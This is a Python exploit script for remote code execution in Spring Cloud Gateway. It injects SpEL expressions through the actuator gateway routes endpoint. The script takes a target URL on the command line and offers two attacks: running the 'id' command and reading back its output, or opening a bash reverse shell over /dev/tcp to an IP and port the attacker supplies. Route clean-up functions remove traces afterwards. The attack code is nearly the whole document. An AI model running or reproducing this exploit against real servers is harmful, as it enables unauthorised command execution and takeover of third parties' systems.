#-*- coding:utf-8 -*-
import requests
import sys
import json
import argparse



header={
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0", 
	"Accept": "*/*",
	"Accept-Language": "en",
	"Accept-Encoding": "gzip, deflate", 
	"Content-Type": "application/json",
	"Connection": "close",
	"Upgrade-Insecure-Requests": "1"
 }

proxies={
	"http":"127.0.0.1:8080",
	"https":"127.0.0.1:8080"
 }
 
CmdPayload={
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

GetShellPayload={
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ip/port 0>&1\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

def usage():
	print('''
 ____             _              ____ _                 _ ____   ____ _____ 
/ ___| _ __  _ __(_)_ __   __ _ / ___| | ___  _   _  __| |  _ \ / ___| ____|
\___ \| '_ \| '__| | '_ \ / _` | |   | |/ _ \| | | |/ _` | |_) | |   |  _|  
 ___) | |_) | |  | | | | | (_| | |___| | (_) | |_| | (_| |  _ <| |___| |___ 
|____/| .__/|_|  |_|_| |_|\__, |\____|_|\___/ \__,_|\__,_|_| \_ \\____|_____|
      |_|                 |___/ 
						           Author: Arenid
	''')

def ReqAddGateway(url):
	VulnPath = "/actuator/gateway/routes/hacktest"
	TargetUrl = url+VulnPath
	response = requests.post(url=TargetUrl,headers=header,data=json.dumps(CmdPayload))
	if response.status_code == 201:
		print("[+]路由创建成功!{}".format(TargetUrl))

def ReqGetShellGateWay(url,ip,port):
	VulnPath = "/actuator/gateway/routes/hacktest"
	TargetUrl = url+VulnPath
	GetShellPayload["filters"][0]["args"]["value"]=GetShellPayload["filters"][0]["args"]["value"].replace("ip",ip).replace("port",port)
	response = requests.post(url=TargetUrl,headers=header,proxies=proxies,data=json.dumps(GetShellPayload))
	if response.status_code == 201:
		print("[+]路由创建成功!{}".format(TargetUrl))
		
def ReqRefreshGateway(url):
	header["Content-Type"]="application/x-www-form-urlencoded"
	VulnPath="/actuator/gateway/refresh"
	TargetUrl = url+VulnPath
	response = requests.post(TargetUrl,proxies=proxies,headers=header)
	if response.status_code == 200:
		print("[+]路由刷新成功!")
	
def ReqDelGateway(url):
	VulnPath="/actuator/gateway/routes/hacktest"
	TargetUrl = url+VulnPath
	response = requests.request("DELETE",url=TargetUrl,headers=header,proxies=proxies)
	if response.status_code == 200:
		print("[+]删除路由成功!{}".format(TargetUrl))

def ReqResult(url):
	header.pop("Content-Type")
	VulnPath="/actuator/gateway/routes/hacktest"
	TargetUrl = url+VulnPath
	response = requests.get(url=TargetUrl,headers=header,proxies=proxies)
	result = response.text.split(",")
	print(result[2].split(" = ")[1].rstrip("]"))

def ExploitCmd(url):
	ReqAddGateway(url)
	ReqRefreshGateway(url)
	ReqResult(url)
	
def ExploitGetShell(url,ip,port):
	try:
		ReqGetShellGateWay(url,ip,port)
		print("[+]正在反弹shell...")
		ReqRefreshGateway(url)
		ReqResult(url)
	except Exception as e:
		print("[+]反弹shell完成...")
		
def main():
	arg=argparse.ArgumentParser(description="please input your command on line!",usage=usage())
	arg.add_argument('-a','--add',action="store_true",help="add a Gateway")
	arg.add_argument('-u','--url',dest="url",type=str,help="Target Url")
	arg.add_argument('-c','--clean',dest="c",action="store_true",help="Clear a Gateway")
	arg.add_argument('-r','--reverse',dest="r",type=str,metavar="reverseIP",help="--shell reverseIP")
	arg.add_argument('-p','--port',dest="p",type=str,help="--port reversePort")
	args=arg.parse_args()
	if args.url:
		url=args.url
		if args.add:
			ExploitCmd(url)
		
		if args.r and args.p:
			ExploitGetShell(url,args.r,args.p)
		
		if args.c:
			ReqDelGateway(url)
			ReqRefreshGateway(url)
	

if __name__ == '__main__':
	main()




